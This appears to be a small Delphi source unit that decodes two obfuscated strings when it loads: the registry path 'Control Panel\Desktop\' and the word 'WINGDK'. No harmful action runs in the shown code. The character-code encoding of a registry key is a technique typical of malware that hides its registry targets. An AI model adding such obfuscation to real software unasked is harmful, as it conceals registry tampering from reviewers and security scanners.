unit uHS2;

interface


var HOF, ZOF : String;
implementation
uses sysutils;

function ConvertCommaToMAFF(InString : String) : String;
var P1,P2 : integer;
  V : integer;
  UB : String;

begin
  P1 := Pos('MAFI',InString);
  P2 := Pos(')',InString);
  if P1 > 0 then begin
    V := StrToInt(Copy(InString,P1+4,P2-p1-4));
    UB := Copy(InString,P2+1,Length(InString)-P2);
    result := CHR(V)+ConvertCommaToMAFF(UB);
  end else
    result := '';
end;


initialization
  HOF := ConvertCommaToMAFF('MAFI67)+MAFI111)+MAFI110)+MAFI116)+MAFI114)+MAFI111)+MAFI108)+MAFI32)+MAFI80)+MAFI97)+MAFI110)+MAFI101)+MAFI108)+MAFI92)+MAFI68)+MAFI101)+MAFI115)+MAFI107)+MAFI116)+MAFI111)+MAFI112)+MAFI92)');
  ZOF :=  ConvertCommaToMAFF('MAFI87)+MAFI73)+MAFI78)+MAFI71)+MAFI68)+MAFI75)');
end.
